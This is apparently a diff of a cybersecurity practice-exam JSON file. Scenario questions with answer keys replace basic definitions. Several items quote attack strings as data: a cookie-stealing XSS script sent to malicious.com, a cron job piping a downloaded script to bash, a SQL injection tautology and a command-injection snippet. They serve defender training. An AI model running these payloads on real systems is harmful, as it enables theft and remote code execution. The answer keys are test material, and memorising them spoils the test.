-      "examTip": "The recovery phase focuses on returning to normal operations after an incident."
+      "correctAnswerIndex": 0,
+      "explanation": "The command downloads and executes a malicious script, which aligns with the 'Execution' tactic in the MITRE ATT&CK framework.",
+      "examTip": "Monitor PowerShell usage for suspicious parameters like '-ep bypass' and in-memory script execution patterns."
     },
     {
       "id": 80,
-      "question": "Which of the following is MOST important when dealing with digital evidence?",
+      "question": "An attacker gains access to a cloud environment and spins up large GPU-powered virtual machines in multiple regions. The activity is detected due to unusual billing charges.\n\nWhat is the attacker's most likely objective?",
       "options": [
-        "Making changes to the original evidence to analyze it. ",
-        "Maintaining a clear chain of custody.",
-        "Sharing the evidence with as many people as possible. ",
-        "Deleting the evidence after the investigation is complete. "
+        "Cryptocurrency mining",
+        "Distributed Denial of Service (DDoS) attack",
+        "Data exfiltration",
+        "Phishing infrastructure deployment"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "You never modify original evidence. Sharing it widely compromises integrity. Deletion destroys evidence. Maintaining a meticulous chain of custody (documenting who had access, when, and why) is absolutely crucial to ensure the evidence is admissible in court and hasn't been tampered with.",
-      "examTip": "Proper handling of digital evidence is essential for legal and investigative purposes."
+      "correctAnswerIndex": 0,
+      "explanation": "High-performance GPU instances are often used by attackers for cryptocurrency mining due to their computational power.",
+      "examTip": "Monitor cloud billing alerts and usage patterns for unexpected spikes, which could indicate unauthorized resource usage."
     },
     {
       "id": 81,
-      "question": "What is a 'zero-day' vulnerability?",
+      "question": "A security analyst identifies multiple successful login attempts to the VPN from an external IP address during non-business hours, followed by data downloads from sensitive file shares.\n\nWhich attack type does this MOST LIKELY represent?",
       "options": [
-        "A vulnerability that has been known for a long time. ",
-        "A vulnerability that is publicly known and has a patch available. ",
-        "A vulnerability that is unknown to the software vendor and has no patch available.",
-        "A vulnerability that is not exploitable. "
+        "Credential compromise with data exfiltration",
+        "Lateral movement after initial access",
+        "Privilege escalation on internal systems",
+        "Brute force attack against VPN credentials"
       ],
-      "correctAnswerIndex": 2,
-      "explanation": "It is not known, and has no available patch. A zero-day vulnerability is a newly discovered flaw. It's called 'zero-day' because the vendor has had zero days to develop a fix. These are highly valuable to attackers because there's no defense against them until a patch is released.",
-      "examTip": "Zero-day vulnerabilities are extremely dangerous because they are unknown and unpatched."
+      "correctAnswerIndex": 0,
+      "explanation": "The combination of external logins and sensitive data downloads suggests that valid credentials were compromised for exfiltration purposes.",
+      "examTip": "Monitor for unusual login times and geographic anomalies in VPN usage."
     },
     {
       "id": 82,
-      "question": "What is 'Nmap' primarily used for?",
+      "question": "An attacker injects the following payload into a web form:\n\n<script>fetch('http://malicious.com/steal?cookie=' + document.cookie)</script>\n\nWhich security issue does this demonstrate?",
       "options": [
-        "Network discovery and security auditing",
-        "Encrypting files. ",
-        "Analyzing malware. ",
-        "Managing user accounts. "
+        "Cross-site scripting (XSS)",
+        "Command injection",
+        "Cross-site request forgery (CSRF)",
+        "SQL injection"
       ],
       "correctAnswerIndex": 0,
-      "explanation": "Nmap is not for encrypting, malware analysis, or user account management. Nmap is a powerful and versatile network scanning tool. It's used to discover hosts and services on a network, identify open ports, determine operating systems, and even detect some vulnerabilities.",
-      "examTip": "Nmap is a fundamental tool for network reconnaissance and security assessments."
+      "explanation": "The script attempts to steal cookies from a user's browser, indicating a cross-site scripting (XSS) attack.",
+      "examTip": "Use output encoding and CSP headers to prevent XSS vulnerabilities."
     },
     {
       "id": 83,
-      "question": "What is the 'principle of least privilege'?",
+      "question": "A threat intelligence feed reports a new malware strain that uses port 53 for covert communication. Network logs reveal unusual DNS requests with large payloads from multiple hosts.\n\nWhat should be the FIRST investigative action?",
       "options": [
-        "Giving all users administrator access. ",
-        "Granting users only the minimum necessary access rights to perform their job duties.",
-        "Using strong passwords for all accounts. ",
-        "Encrypting all data at rest. "
+        "Analyze DNS logs for potential tunneling activity",
+        "Block outbound port 53 traffic at the firewall",
+        "Inspect endpoint processes for suspicious activity",
+        "Deploy network-based antivirus scanning tools"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "It does not give all users admin access, while passwords and encryption are very important to security they do not represent the definition. The principle of least privilege is a fundamental security concept. It means users (and processes) should only have the minimum necessary permissions to do their work. This limits the potential damage from compromised accounts or insider threats.",
-      "examTip": "Always apply the principle of least privilege to minimize the potential impact of security breaches."
+      "correctAnswerIndex": 0,
+      "explanation": "Large DNS payloads may indicate DNS tunneling for covert communication; analyzing DNS logs is the first step for confirmation.",
+      "examTip": "DNS tunneling often uses large DNS TXT records—monitor these for unusual patterns."
     },
     {
       "id": 84,
-      "question": "What is 'Wireshark' primarily used for?",
+      "question": "A developer commits code that includes the following line:\n\naws_access_key_id = \"AKIAIOSFODNN7EXAMPLE\"\n\nWhat security risk does this introduce?",
       "options": [
-        "Network packet analysis",
-        "Intrusion detection. ",
-        "Firewall management. ",
-        "Vulnerability scanning. "
+        "Exposure of cloud credentials leading to unauthorized access",
+        "Weak encryption allowing brute force decryption",
+        "Injection vulnerability in cloud infrastructure",
+        "Misconfigured access policies enabling privilege escalation"
       ],
       "correctAnswerIndex": 0,
-      "explanation": "Wireshark does more than detect intrusions, manage firewalls, or scan for vulnerabilities. Wireshark is a widely-used packet capture and analysis tool. It allows you to capture network traffic and examine it in detail, inspecting individual packets to troubleshoot network problems, analyze protocols, and detect malicious activity.",
-      "examTip": "Wireshark is an essential tool for network troubleshooting and security analysis."
+      "explanation": "Exposing AWS access keys in code repositories can lead to unauthorized access, potentially resulting in full environment compromise.",
+      "examTip": "Use environment variables and IAM roles instead of hardcoding credentials."
     },
     {
       "id": 85,
-      "question": "Which of the following is a good security practice to mitigate the risk of ransomware attacks?",
+      "question": "The following cron job is discovered on a Linux server:\n\n* * * * * wget http://malicious.com/payload.sh -O- | bash\n\nWhat is the likely purpose of this cron job?",
       "options": [
-        "Paying the ransom immediately if infected. ",
-        "Regularly  backing up data and storing backups offline or in a separate, secure location.",
-        "Disabling all security software to improve system performance. ",
-        "Opening all email attachments without caution. "
+        "Persistence mechanism for continuous malware execution",
+        "Privilege escalation via script execution",
+        "Data exfiltration using scheduled scripts",
+        "Disabling endpoint protection at regular intervals"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "Paying the ransom doesn't guarantee data recovery and encourages further attacks. Disabling security software is extremely risky. Opening attachments carelessly is a major infection vector. Regular, offline backups are crucial. If ransomware encrypts your data, you can restore from backups without paying the ransom. The backups must be offline or isolated to prevent the ransomware from encrypting them too.",
-      "examTip": "Reliable backups are the best defense against ransomware."
+      "correctAnswerIndex": 0,
+      "explanation": "The cron job downloads and executes a script every minute, ensuring persistent execution of malicious code.",
+      "examTip": "Review and validate cron jobs regularly for unauthorized persistent tasks."
     },
     {
       "id": 86,
-      "question": "What is the primary purpose of a 'firewall'?",
+      "question": "A cloud security audit reveals that SSH ports are open to the internet for multiple virtual machines. The environment contains sensitive customer data.\n\nWhat should be the MOST immediate remediation?",
       "options": [
-        "To encrypt network traffic. ",
-        "To filter network traffic based on predefined rules, blocking unauthorized access.",
-        "To detect and remove malware. ",
-        "To manage user accounts and passwords. "
+        "Restrict SSH access to specific IP addresses using security groups",
+        "Enable multi-factor authentication (MFA) for SSH connections",
+        "Configure VPN access for all cloud-based SSH sessions",
+        "Deploy a bastion host to manage administrative access"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "Firewalls don't primarily encrypt traffic, detect malware (though some have that capability), or manage accounts. A firewall acts as a barrier between networks (e.g., your internal network and the internet). It examines network traffic and blocks or allows it based on a set of rules, preventing unauthorized access to your network.",
-      "examTip": "A firewall is a fundamental network security control that acts as a gatekeeper for network traffic."
+      "correctAnswerIndex": 0,
+      "explanation": "Restricting SSH access to trusted IP addresses reduces the attack surface and prevents unauthorized internet-wide access.",
+      "examTip": "Publicly exposed SSH ports are high-risk—always apply least-privilege network access rules."
     },
     {
       "id": 87,
-      "question": "Which type of malware disguises itself as a legitimate program to trick users into installing it?",
+      "question": "A suspicious PowerShell command is detected:\n\npowershell.exe -enc SQBtAG0AbwByAHQAIABzAG8AbQBlACAAYwBvAGQAZQ==\n\nWhat is the significance of the '-enc' flag in this context?",
       "options": [
-        "Virus. ",
-        "Worm. ",
-        "Trojan Horse",
-        "Spyware. "
+        "It indicates that the command is encoded to obfuscate its true purpose",
+        "It allows the command to run with elevated privileges",
+        "It bypasses execution policy settings on the system",
+        "It loads a malicious module into PowerShell memory"
       ],
-      "correctAnswerIndex": 2,
-      "explanation": "Viruses need a host file. Worms self-replicate. Spyware operates secretly. A Trojan Horse (or simply 'Trojan') is named after the mythical Trojan Horse. It pretends to be a useful program (a game, a utility, etc.) but contains malicious code that executes when the user runs it.",
-      "examTip": "Be cautious about downloading and installing software from untrusted sources to avoid Trojan Horses."
+      "correctAnswerIndex": 0,
+      "explanation": "The '-enc' flag indicates base64-encoded PowerShell commands, a common technique used to hide malicious actions.",
+      "examTip": "Monitor for encoded PowerShell commands—they are often used in obfuscation and evasion techniques."
     },
     {
       "id": 88,
-      "question": "Which of the following is an example of 'multi-factor authentication (MFA)'?",
+      "question": "A web application vulnerability allows an attacker to include a remote file for execution on the server using user-controlled input.\n\nWhich vulnerability does this represent?",
       "options": [
-        "Using a strong password. ",
-        "Using a username and password, plus a one-time code from a mobile app.",
-        "Using a fingerprint scanner only. ",
-        "Using facial recognition only. "
+        "Remote File Inclusion (RFI)",
+        "Local File Inclusion (LFI)",
+        "Server-side request forgery (SSRF)",
+        "Cross-site scripting (XSS)"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "A strong password is single-factor. Fingerprint or facial recognition alone are also single factors. MFA requires two or more different types of authentication factors: something you know (password), something you have (phone, security token), or something you are (biometric). The combination of username/password and a one-time code is a classic example of MFA.",
-      "examTip": "MFA significantly improves security by requiring multiple forms of authentication."
+      "correctAnswerIndex": 0,
+      "explanation": "RFI vulnerabilities occur when user input allows remote files to be fetched and executed on the server, potentially leading to remote code execution.",
+      "examTip": "Sanitize all user input related to file handling and enforce strict path whitelisting."
     },
     {
       "id": 89,
-      "question": "What is the purpose of 'penetration testing'?",
+      "question": "You detect a pattern in logs showing the following sequence:\n- Multiple failed login attempts\n- Successful login from a new device\n- Creation of new privileged user accounts\n- Configuration changes in firewall rules\n\nWhich phase of the cyber kill chain does this activity represent?",
       "options": [
-        "To identify all known software vulnerabilities. ",
-        "To simulate a real-world attack on a system or network to identify exploitable weaknesses and test security controls.",
-        "To automatically fix security vulnerabilities. ",
-        "To encrypt data at rest and in transit. "
+        "Actions on Objectives",
+        "Installation",
+        "Lateral Movement",
+        "Command and Control"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "Vulnerability scanning identifies weaknesses; penetration testing exploits them. It doesn't automatically fix vulnerabilities or encrypt data. Penetration testing (or 'pen testing') is ethical hacking. Authorized security professionals simulate attacks to find and exploit vulnerabilities, demonstrating the real-world impact of those weaknesses and helping organizations improve their defenses.",
-      "examTip": "Penetration testing goes beyond vulnerability scanning by actively attempting to exploit weaknesses."
+      "correctAnswerIndex": 0,
+      "explanation": "The creation of privileged accounts and system configuration changes indicate the attacker is achieving their final goals ('Actions on Objectives').",
+      "examTip": "Watch for administrative actions following suspicious logins—often part of the final attack phase."
     },
     {
       "id": 90,
-      "question": "What is 'salting' in the context of password security?",
+      "question": "A threat hunter detects that an endpoint is beaconing to an external IP address over port 8080 every hour. The connection uses minimal data and does not establish a persistent session.\n\nWhat is this behavior MOST likely indicative of?",
       "options": [
-        "Encrypting passwords. ",
-        "Adding a random string to a password before hashing it, making it more resistant to rainbow table attacks.",
-        "Storing passwords in plain text. ",
-        "Using the same password for multiple accounts. "
+        "Command-and-control (C2) beaconing",
+        "Denial-of-service (DoS) attack preparation",
+        "Credential harvesting activity",
+        "Lateral movement within the network"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "Salting is not encrypting, storing in plain text, or using same password. Salting adds a unique, random string to each password before it's hashed.  This makes pre-computed rainbow table attacks (which use pre-calculated hashes of common passwords) ineffective, because the salt changes the hash even for the same password.",
-      "examTip": "Salting is a crucial technique for protecting stored passwords."
+      "correctAnswerIndex": 0,
+      "explanation": "Low-frequency outbound connections with minimal data transfer suggest C2 beaconing, where the malware checks for attacker instructions.",
+      "examTip": "Monitor endpoints for periodic, low-data outbound connections—common indicators of C2 communication."
     },
     {
       "id": 91,
-      "question": "What is the primary difference between an IDS and an IPS?",
+      "question": "A security analyst detects repeated outbound connections from an internal host to IP 203.0.113.10 on port 53. The DNS queries contain long, encoded strings.\n\nWhat technique is MOST likely being used by the attacker?",
       "options": [
-        "An IDS is hardware-based, while an IPS is software-based. ",
-        "An IDS detects malicious activity, while an IPS detects and prevents it.",
-        "An IDS is used for network traffic analysis, while an IPS is used for vulnerability scanning. ",
-        "There is no significant difference. "
+        "DNS tunneling for data exfiltration",
+        "Domain generation algorithm (DGA) for C2 communication",
+        "DNS spoofing for redirection to malicious servers",
+        "DNS amplification for DDoS attacks"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "Both can be hardware or software.  IPS does more than vulnerability scanning. The core difference is prevention. An IDS (Intrusion Detection System) detects suspicious activity and generates alerts. An IPS (Intrusion Prevention System) goes further: it can block or prevent malicious traffic based on its ruleset.",
-      "examTip": "An IDS detects, while an IPS detects and prevents."
+      "correctAnswerIndex": 0,
+      "explanation": "Long encoded DNS queries suggest DNS tunneling, which attackers use to exfiltrate data while bypassing network controls.",
+      "examTip": "Monitor for unusually large or frequent DNS queries—signs of potential tunneling."
     },
     {
       "id": 92,
-      "question": "Which type of attack involves flooding a target system with traffic to make it unavailable to legitimate users?",
+      "question": "The following code snippet is discovered in a web application:\n\nsystem(\"ping \" + $_GET['host']);\n\nWhat vulnerability does this code introduce?",
       "options": [
-        "Cross-Site Scripting (XSS). ",
-        "SQL Injection. ",
-        "Denial-of-Service (DoS)",
-        "Phishing. "
+        "Command injection",
+        "Cross-site scripting (XSS)",
+        "SQL injection",
+        "Insecure deserialization"
       ],
-      "correctAnswerIndex": 2,
-      "explanation": "XSS targets websites, SQL Injection targets databases, and Phishing is social engineering. A DoS (Denial-of-Service) attack aims to disrupt service availability.  It overwhelms the target system (a server, a website, etc.) with traffic, making it unable to respond to legitimate requests.",
-      "examTip": "DoS attacks aim to disrupt service availability by overwhelming the target."
+      "correctAnswerIndex": 0,
+      "explanation": "The use of user-controlled input in a system command (`$_GET['host']`) without sanitization exposes the application to command injection.",
+      "examTip": "Always sanitize user input before passing it to system-level functions to prevent command injection."
     },
     {
       "id": 93,
-      "question": "Which command is used to display the routing table on a Windows system?",
+      "question": "A penetration test reveals that session tokens are predictable and do not expire upon logout.\n\nWhich risk does this present to the application?",
       "options": [
-        "ipconfig. ",
-        "ping. ",
-        "tracert. ",
-        "route print"
+        "Session hijacking",
+        "Cross-site request forgery (CSRF)",
+        "SQL injection",
+        "Insecure direct object reference (IDOR)"
       ],
-      "correctAnswerIndex": 3,
-      "explanation": "ipconfig shows network interface configuration.  ping tests connectivity. tracert traces the route to a destination. `route print` specifically displays the Windows routing table, showing how network traffic is directed.",
-      "examTip": "The `route print` command is useful for troubleshooting network routing issues on Windows."
+      "correctAnswerIndex": 0,
+      "explanation": "Predictable, persistent session tokens make it easier for attackers to hijack user sessions and impersonate legitimate users.",
+      "examTip": "Ensure session tokens are random, securely generated, and expire after logout."
     },
     {
       "id": 94,
-      "question": "What is the primary purpose of 'hashing' in cybersecurity?",
+      "question": "A user reports being redirected to a malicious site after clicking a link from a trusted website. The URL in the browser shows:\n\nhttps://trustedsite.com/redirect?url=http://malicious.com\n\nWhich vulnerability is MOST LIKELY being exploited?",
       "options": [
-        "To encrypt data. ",
-        "To create a one-way, irreversible transformation of data, often used for password storage and data integrity checks.",
-        "To decrypt data. ",
-        "To compress data. "
+        "Open redirect",
+        "Cross-site scripting (XSS)",
+        "SQL injection",
+        "Remote file inclusion (RFI)"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "Hashing is not encryption (which is reversible).  It's not decryption or compression. Hashing takes data and produces a fixed-size, unique 'fingerprint' (the hash).  It's one-way: you can't get the original data back from the hash. This is used for storing passwords securely (you store the hash, not the password) and for verifying data integrity (if the hash changes, the data has been altered).",
-      "examTip": "Hashing is used for data integrity and secure password storage, not for encryption."
+      "correctAnswerIndex": 0,
+      "explanation": "An open redirect occurs when user-controlled input determines the destination URL without validation, potentially leading to phishing attacks.",
+      "examTip": "Validate and whitelist redirect URLs to prevent open redirect vulnerabilities."
     },
     {
       "id": 95,
-      "question": "What is the purpose of using a 'VPN'?",
+      "question": "An attacker attempts to bypass authentication by submitting the following in the username field:\n\n' OR '1'='1\n\nWhat type of attack is this?",
       "options": [
-        "To filter network traffic based on rules. ",
-        "To create a secure, encrypted connection between a device and a network, often used for remote access.",
-        "To detect and remove malware. ",
-        "To manage user accounts and passwords. "
+        "SQL injection",
+        "Cross-site scripting (XSS)",
+        "Command injection",
+        "Session fixation"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "A VPN is not for filtering traffic (that's a firewall), detecting malware, or managing accounts. A VPN (Virtual Private Network) creates an encrypted 'tunnel' over a public network (like the internet). This allows a user to connect securely to a private network (like a corporate network) from a remote location, as if they were directly connected.",
-      "examTip": "VPNs provide secure remote access to private networks."
+      "correctAnswerIndex": 0,
+      "explanation": "The payload attempts to manipulate SQL queries by using a tautology (`'1'='1`), a common SQL injection technique for bypassing authentication.",
+      "examTip": "Use parameterized queries to prevent SQL injection vulnerabilities."
     },
     {
       "id": 96,
-      "question": "What is 'reverse engineering' in the context of software security?",
+      "question": "During threat hunting, you observe repeated HTTP requests from an internal host to an external IP on port 4444.\n\nWhat does this behavior MOST LIKELY indicate?",
       "options": [
-        "The process of writing secure code. ",
-        "The process of analyzing a compiled program to understand its functionality, often used for malware analysis or vulnerability research.",
-        "The process of testing software for bugs. ",
-        "The process of designing a software application. "
+        "Reverse shell communication",
+        "Data exfiltration via HTTP tunneling",
+        "Distributed denial-of-service (DDoS) attack",
+        "Phishing infrastructure connection"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "Reverse engineering is not writing code, general testing, or design. Reverse engineering involves taking a compiled program (the executable) and analyzing it to figure out how it works.  This can be done to understand malware, find vulnerabilities, or even to improve software interoperability.",
-      "examTip": "Reverse engineering is used to understand the inner workings of software, often for security purposes."
+      "correctAnswerIndex": 0,
+      "explanation": "Port 4444 is commonly used for reverse shell connections (e.g., by Metasploit), indicating the host may be under remote control.",
+      "examTip": "Investigate outbound connections on uncommon ports like 4444—common in remote access scenarios."
     },
     {
       "id": 97,
-      "question": "Which of the following is a common characteristic of 'script kiddies'?",
+      "question": "A malware sample analyzed in a sandbox:\n- Spawns multiple child processes\n- Disables endpoint protection services\n- Encrypts user directories\n\nWhich type of malware does this behavior represent?",
       "options": [
-        "They are highly skilled hackers with extensive knowledge of security vulnerabilities. ",
-        "They typically use existing hacking tools and scripts, often without a deep understanding of how they work.",
-        "They are motivated by political activism. ",
-        "They are employed by nation-states to conduct cyber espionage. "
+        "Ransomware",
+        "Rootkit",
+        "Trojan",
+        "Worm"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "Script kiddies are not highly skilled; they often lack deep understanding. Hacktivists are politically motivated. Nation-state actors are highly sophisticated. Script kiddies are often less experienced individuals who use pre-made hacking tools and scripts found online. They may not fully understand the underlying principles or consequences of their actions.",
-      "examTip": "Script kiddies are often opportunistic attackers who use readily available tools."
+      "correctAnswerIndex": 0,
+      "explanation": "Encryption of user directories combined with disabling security tools indicates ransomware, which encrypts files to demand payment.",
+      "examTip": "Ransomware behavior includes rapid encryption processes and attempts to disable security mechanisms."
     },
     {
       "id": 98,
-      "question": "What is a 'logic bomb'?",
+      "question": "A vulnerability scan detects the following issue:\n- CVSS Score: 9.8 (Critical)\n- Network exploitable\n- No authentication required\n- Remote code execution possible\n\nWhat should be the FIRST remediation step?",
       "options": [
-        "A type of firewall. ",
-        "A piece of malicious code that is triggered by a specific event or condition, such as a date, time, or user action.",
-        "A type of encryption algorithm. ",
-        "A method for securing network traffic. "
+        "Apply vendor patches immediately",
+        "Segment vulnerable systems from the network",
+        "Notify stakeholders of potential exposure",
+        "Conduct penetration testing to validate exploitability"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "A logic bomb isn't a security device or method. A logic bomb is malicious code embedded within a program. It remains dormant until a specific condition is met (a date, a file being deleted, a user logging in, etc.). When triggered, it executes its malicious payload (deleting files, disrupting systems, etc.).",
-      "examTip": "Logic bombs are triggered by specific events or conditions."
+      "correctAnswerIndex": 0,
+      "explanation": "A critical, remotely exploitable vulnerability with no authentication required must be patched immediately to prevent exploitation.",
+      "examTip": "Prioritize patching for vulnerabilities with high CVSS scores and easy network exploitability."
     },
     {
       "id": 99,
-      "question": "Which of the following is a benefit of using 'security information and event management (SIEM)'?",
+      "question": "A web application allows users to upload files but does not validate file types. An attacker uploads a PHP file that provides remote shell access.\n\nWhich vulnerability is being exploited?",
       "options": [
-        "SIEMs eliminate the need for other security controls. ",
-        "SIEMs provide centralized log management, real-time monitoring, and correlation of security events.",
-        "SIEMs guarantee complete protection against all cyber threats. ",
-        "SIEMs are only useful for large enterprises with dedicated security teams. "
+        "Unrestricted file upload",
+        "Cross-site scripting (XSS)",
+        "SQL injection",
+        "Directory traversal"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "SIEMs enhance, not replace, other controls. They don't guarantee total protection, and they benefit organizations of various sizes. SIEMs are crucial for security monitoring. They collect logs from many sources, analyze them in real-time, correlate events, and generate alerts, providing a comprehensive view of security posture.",
-      "examTip": "SIEM systems are essential for centralized security monitoring and incident response."
+      "correctAnswerIndex": 0,
+      "explanation": "Unrestricted file uploads can lead to remote code execution if attackers upload executable files that the server executes.",
+      "examTip": "Validate file extensions, MIME types, and restrict executable uploads to prevent file upload vulnerabilities."
     },
     {
       "id": 100,
-      "question": "Which of the following is the BEST description of 'risk mitigation'?",
+      "question": "During a cloud security assessment, it is found that storage buckets containing sensitive data are publicly accessible.\n\nWhich action should be taken FIRST to mitigate this risk?",
       "options": [
-        "Ignoring all identified risks. ",
-        "Acknowledging the existence of a risk and choosing to take no action. ",
-        "Implementing controls to reduce the likelihood or impact of a risk.",
-        "Transferring the risk to a third party. "
+        "Apply proper access control policies to restrict public access",
+        "Encrypt all data at rest using provider-managed keys",
+        "Set up logging to monitor access attempts to storage buckets",
+        "Configure versioning to recover from accidental deletions"
       ],
-      "correctAnswerIndex": 2,
-      "explanation": "Risk mitigation is not ignoring, accepting without action, or transferring. Risk mitigation involves taking action to reduce the risk. This could involve implementing security controls (like firewalls, patching, access controls) to reduce the likelihood of a successful attack or to lessen the impact if an attack occurs.",
-      "examTip": "Risk mitigation involves actively reducing the likelihood or impact of identified risks."
+      "correctAnswerIndex": 0,
+      "explanation": "Restricting public access immediately prevents unauthorized users from accessing sensitive data.",
+      "examTip": "Cloud storage should always have least-privilege access policies—deny public access unless explicitly required."
     }
   ]
 });
